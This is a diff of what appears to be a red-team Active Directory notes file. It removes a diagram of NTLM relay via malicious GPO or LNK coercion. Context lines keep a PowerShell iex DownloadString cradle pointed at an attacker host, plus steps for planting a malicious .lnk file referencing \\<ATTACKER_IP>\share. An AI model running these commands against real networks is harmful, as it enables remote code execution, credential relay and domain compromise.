@@ -46,19 +46,6 @@ powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://<ATTACK
 
 Group Policy Objects can be abused to coerce domain computer/user accounts to authenticate back to an attacker-controlled relay server.
 
-```mermaid
-graph TD
-    Attacker["Attacker Host (ntlmrelayx / Listener)"]
-    GPO["Target GPO / File Share"]
-    Victim["Domain User / Machine"]
-    DC["Domain Controller / Target Host"]
-
-    Attacker -- "1. Modify GPO / Upload .LNK file" --> GPO
-    Victim -- "2. Browse Share / Triggers LNK Icon Download" --> Attacker
-    Attacker -- "3. Relays NTLM Authentication" --> DC
-    DC -- "4. Grants Local Admin / Updates DACL" --> Attacker
-```
-
 ### Attack Sequence
 1. Locate a target GPO or SYSVOL share with `Write` or `WriteDacl` permissions (`Get-DomainGPO` / `Get-DomainOU`).
 2. Place a malicious `.lnk` shortcut file or modify the GPO configuration path to point to the attacker IP (`\\<ATTACKER_IP>\share`).
